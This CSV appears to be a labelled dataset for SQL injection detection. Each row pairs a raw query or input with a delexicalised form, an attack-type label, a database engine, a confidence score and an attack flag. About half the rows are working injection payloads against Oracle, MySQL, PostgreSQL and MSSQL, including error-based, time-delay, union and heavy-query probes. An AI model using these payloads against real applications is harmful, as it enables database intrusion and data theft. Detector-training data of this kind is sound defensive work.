payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
"select * from users WHERE username = ""1\'+ ( select \'rejz\' where 1530 = 1530 and username = ""-3733\' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __INT__ __STR__ __IDENT__ __STR__ ) ) or __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",boolean_blind,oracle,0.8,True
"select * from users WHERE username = ""-9295 ) ) ) and username = ""-7430\' ) as xfah where 1596 = 1596 --"" and username = ""-9501\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'njge\' like \'njge"" and username = ""-6523""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.8,True
choon,__IDENT__,benign,generic,0.9,False
SELECT * FROM nuts WHERE exercise = 'married' AND City = 'step',select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,benign,generic,1.0,False
"select * from users WHERE username = ""1"" or username = ""1\'+ ( select oljg where 2006 = 2006 and username = ""-3899\' ) where 8152 = 8152 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,postgresql,0.9,True
SELECT option_value FROM wp_options WHERE option_name = 'site_logo' LIMIT 1,select __IDENT__ from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,mysql,0.9,False
"SELECT * FROM nobody WHERE vertical IN ( 'neighborhood', 'spent', 'opportunity' )","select * from __IDENT__ where __IDENT__ in ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False
"-7448 union all select 4072,4072#","- __INT__ union all select __INT__ , __INT__",union_based,generic,0.7,True
SELECT AVG ( broad ) FROM trouble,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
SELECT * INTO CustomersBackup2017 FROM Customers;,select * into __IDENT__ from __IDENT__ ;,benign,mysql,0.9,False
"select * from users WHERE username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-1254"" or username = ""1"" or username = ""-4322\' ) ) as magw where 1627 = 1627",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ - __INT__ __STR__ __INT__ __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__,error_based,oracle,0.9,True
SELECT AVG ( Price ) FROM our,select avg ( __IDENT__ ) from __IDENT__,benign,mysql,0.9,False
69671861p,__IDENT__,benign,generic,0.9,False
"1"" ) ) as nwnp where 6140 = 6140",__INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.8,True
"select * from users WHERE username = ""-7452\' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1\'|| ( select \'vasx\' where 4770 = 4770","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ | | ( select \ __STR__ where __INT__ = __INT__",boolean_blind,generic,0.5,True
"select * from users WHERE username = ""-5152\' ) ) || 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( \'jumr\' like \'jumr"" or username = ""1\' in boolean mode )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ in __IDENT__ __IDENT__ ),error_based,oracle,0.9,True
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and '%' = ',( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) and __STR__ = ',time_blind,mysql,0.7,True
"SELECT * FROM users WHERE username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # sipo"" AND username = ""1\'+ ( select oljg where 2006 = 2006",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ + ( select __IDENT__ where __INT__ = __INT__,error_based,oracle,0.95,True
"select * from users WHERE username = ""1%\' or username = ""1\' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'mmow\' = \'mmow""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,postgresql,0.9,True
"select * from users WHERE username = ""1%\' ) ) ) and username = ""-8007\' ) ) as bgpp where 9555 = 9555 and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and \'qibr\' = \'qibr""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.95,True
1' ) ) and 7533 = 7533 and ( ( 'gvoh' = 'gvoh,__INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.5,True
"1"" ) as assu where 7521 = 7521 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) - -",heavy_query,mssql,0.85,True
"select * from users WHERE username = ""1%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-6079 ) ) ) or# 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) ) ) or __INT__ = __IDENT__ ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) )",boolean_blind,oracle,0.8,True
morcn,__IDENT__,benign,generic,0.9,False
1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) -- saxs,__INT__ __IDENT__ ( select * from ( select ( sleep ( __INT__ ) ) ) __IDENT__ ) - - __IDENT__,time_blind,mysql,0.7,True
SELECT * FROM long WHERE ten = 'larger' OR from = 'construction',select * from __IDENT__ where __IDENT__ = __STR__ or from = __STR__,benign,generic,1.0,False
"select * from users WHERE username = ""-1254"" or username = ""1 ) and ( 3530 = 3530"" or username = ""1\' ) ) as plbt where 4368 = 4368",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) as __IDENT__ where __INT__ = __INT__,boolean_blind,generic,0.85,True
SELECT * FROM science WHERE blood NOT BETWEEN 'raise' AND 'shaking',select * from __IDENT__ where __IDENT__ not between __STR__ and __STR__,benign,generic,1.0,False
"select * from users WHERE username = ""-8069\' ) ) and username = ""1\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )",error_based,oracle,0.95,True
"select * from users where id = 1 or "" ( #"" or 1 = 1 -- 1",select * from __IDENT__ where __IDENT__ = __INT__ or __STR__ or __INT__ = __INT__ - - __INT__,boolean_blind,mysql,0.8,True
1 and 2620 = 2175,__INT__ and __INT__ = __INT__,boolean_blind,generic,0.5,True
9.30174E+15,__IDENT__ + __INT__,benign,generic,0.9,False
"SELECT COUNT ( trip ) , apart FROM fish BY rain","select count ( __IDENT__ ) , __IDENT__ from __IDENT__ by __IDENT__",benign,generic,1.0,False
"1"" ) as rovd where 3764 = 3764 and elt ( 4249 = 4249,7259 ) --","__INT__ ) as __IDENT__ where __INT__ = __INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) - -",boolean_blind,mysql,0.8,True
select * from users where id = 1 + $+%$ or 1 = 1 -- 1,select * from __IDENT__ where __IDENT__ = __INT__ + __IDENT__ + % __IDENT__ or __INT__ = __INT__ - - __INT__,boolean_blind,mysql,0.8,True
destriana,__IDENT__,benign,generic,0.9,False
donadieu zanotti,__IDENT__ __IDENT__,benign,generic,0.9,False
"select * from users WHERE username = ""-9501\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'opyp\' = \'opyp""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True
1 ) where 6304 = 6304,__INT__ ) where __INT__ = __INT__,boolean_blind,generic,0.5,True
"select * from users where id = 1 union select !<1,version ( ) -- 1","select * from __IDENT__ where __IDENT__ = __INT__ union select ! < __INT__ , version ( ) - - __INT__",union_based,mysql,0.8,True
SELECT AVG ( mighty ) FROM company,select avg ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False
"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-6179 ) ) and ( ( 7732 = 7732""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,union_based,oracle,0.95,True
"SELECT somewhere,list,up FROM log LEFT JOIN Orders ON income.pieID = later.disappear ORDER BY summer.coast","select __IDENT__ , __IDENT__ , __IDENT__ from __IDENT__ left join __IDENT__ on __IDENT__ = __IDENT__ order by __IDENT__",benign,generic,1.0,False
"SELECT fifth,spirit,travel,color,running ( ( finger JOIN command ON mouse.bone = house.entirely ) INNER JOIN lakeON Orders.go = mysterious.consistID )","select __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ( ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ ) inner join __IDENT__ __IDENT__ = __IDENT__ )",benign,generic,1.0,False
SELECT TOP 50 PERCENT * FROM needle SELECT * FROM week FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM guide,select top __INT__ __IDENT__ * from __IDENT__ select * from __IDENT__ fetch first __INT__ __IDENT__ rows __IDENT__ top __INT__ * from __IDENT__,benign,generic,1.0,False
"1"" ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( ""xnsj"" like ""xnsj",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,heavy_query,mysql,0.85,True
"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""ccuy"" = ""ccuy",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,heavy_query,oracle,0.7,True
"SELECT Employees.warm, COUNT ( Orders.twoID ) AS diagramFROM ( OrdersINNER JOIN shadow ON Orders.pondID = Employees.norID )","select __IDENT__ , count ( __IDENT__ ) as __IDENT__ ( __IDENT__ join __IDENT__ on __IDENT__ = __IDENT__ )",benign,generic,1.0,False
1 ) where 4653 = 4653 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,__INT__ ) where __INT__ = __INT__ or __INT__ = ( select __INT__ from __IDENT__ ( __INT__ ) ) - -,time_blind,postgresql,0.9,True
"select * from users WHERE username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""1 ) or username = ""1%\' ) )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ),boolean_blind,oracle,0.8,True
"select * from users WHERE username = ""1\' ) and ( \'bmhw\' like \'bmhw"" or username = ""1\' ) ) and ( ( \'mmfq\' = \'mmfq"" and username = ""1\' ) as ulbr where 7233 = 7233",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ and __IDENT__ = __INT__ ) as __IDENT__ where __INT__ = __INT__,auth_bypass,generic,0.85,True
whit,__IDENT__,benign,generic,0.9,False
1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and 'vwve' like 'vwve,__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,mysql,0.7,True
SELECT * FROM near WHERE bill NOT BETWEEN 'further' AND 'nice',select * from __IDENT__ where __IDENT__ not between __STR__ and __STR__,benign,generic,1.0,False
SELECT stuck ( s ) FROM development SELECT though FROM upon,select __IDENT__ ( __IDENT__ ) from __IDENT__ select __IDENT__ from __IDENT__,benign,generic,1.0,False
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki"" or username = ""1\' ) where 1502 = 1502 and username = ""-9501\' ) and ( \'mndw\' = \'mndw""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,auth_bypass,generic,0.6,True
"select * from users WHERE username = ""1%\' and ( ( 9452 = 9452"" and username = ""1%\' ) ) and ( ( \'%\' = \'""",select * from __IDENT__ where __IDENT__ = __STR__,boolean_blind,generic,0.5,True
pacn,__IDENT__,benign,generic,0.9,False
valverde de valdelacasa,__IDENT__ __IDENT__ __IDENT__,benign,generic,0.9,False
modorrillo,__IDENT__,benign,generic,0.9,False
"plza. gazteluzarra, 105 7?b","__IDENT__ __IDENT__ , __INT__ __IDENT__",benign,generic,0.9,False
"SELECT * FROM hunt WHERE drew NOT IN ( 'snake', 'hill', 'plural' )","select * from __IDENT__ where __IDENT__ not in ( __STR__ , __STR__ , __STR__ )",benign,generic,1.0,False
"-8013%"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,- __INT__ % __STR__ % __STR__,error_based,mssql,0.9,True
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ""gknn"" like ""gknn",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True
"1%"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --","__INT__ % "" ) ) and __INT__ = ( select count ( * ) from __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ , __IDENT__ __IDENT__ ) - -",boolean_blind,mysql,0.8,True
"select * from users WHERE username = ""-7184 ) as fshx where 3408 = 3408 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" or username = ""1\' ) as pogx where 4105 = 4105",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) as __IDENT__ where __INT__ = __INT__,boolean_blind,oracle,0.8,True
SELECT * FROM his FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM needle,select * from __IDENT__ fetch first __INT__ rows only select top __INT__ __IDENT__ * from __IDENT__,benign,generic,1.0,False
"1' ) where 1577 = 1577 union all select null,null,null,null,null,null#","__INT__ ) where __INT__ = __INT__ union all select null , null , null , null , null , null",union_based,generic,0.85,True
select ( case when ( 9732 = 7136 ) then 9732 else 9732* ( select 9732 from information_schema.character_sets ) end ) #,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) #,boolean_blind,mysql,0.8,True
"1"" where 4345 = 4345 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",__INT__ where __INT__ = __INT__ and __INT__ = __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) - -,error_based,oracle,0.9,True
"SELECT birdsID AS ID, suit AS still FROM rubbed","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,mysql,0.9,False
moriyama,__IDENT__,benign,generic,0.9,False
"llobregat 130,","__IDENT__ __INT__ ,",benign,generic,0.9,False
"select * from users WHERE username = ""-1254"" or username = ""1 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.95,True
"select * from users WHERE username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-3185\' ) )","select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) and __IDENT__ = "" - __INT__ ) )",error_based,oracle,0.95,True
